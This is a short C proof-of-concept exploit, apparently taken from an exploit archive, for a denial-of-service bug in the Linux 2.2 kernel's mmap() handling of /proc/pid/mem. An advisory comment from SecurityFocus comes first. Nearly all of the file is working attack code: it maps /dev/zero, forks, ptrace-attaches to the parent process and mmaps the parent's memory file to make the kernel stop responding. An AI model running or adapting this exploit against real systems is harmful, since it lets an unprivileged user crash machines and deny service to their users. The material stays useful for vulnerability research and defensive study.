/*
source: http://www.securityfocus.com/bid/6420/info

A denial of service vulnerability has been discovered in the Linux 2.2 kernel. It has been reported that it is possible for an unprivileged user to cause the kernel to stop responding due to a bug in the implementation of mmap().

It should be noted that this issue does not affect the 2.4 kernel tree. This is because support for mmap() in the /proc/pid/mem implementation has been dropped. 
*/


   #define PAGES 10

   #include <asm/page.h>
   #include <sys/mman.h>
   #include <unistd.h>
   #include <stdio.h>
   #include <fcntl.h>
   #include <sys/ptrace.h>

   int main() {
     int ad1,ad2,zer,mem,pid,i;
     zer=open("/dev/zero",O_RDONLY);
     ad1=(int)mmap(0,PAGES*PAGE_SIZE,0,MAP_PRIVATE,zer,0);
     pid=getpid();
     if (!fork()) {
       char p[64];
       ptrace(PTRACE_ATTACH,pid,0,0);
       sleep(1);
       sprintf(p,"/proc/%d/mem",pid);
       mem=open(p,O_RDONLY);
       ad2=(int)mmap(0,PAGES*PAGE_SIZE,PROT_READ,MAP_PRIVATE,mem,ad1);
       write(1,(char*)ad2,PAGES*PAGE_SIZE);
     }
     sleep(100);
     return 0;
   }
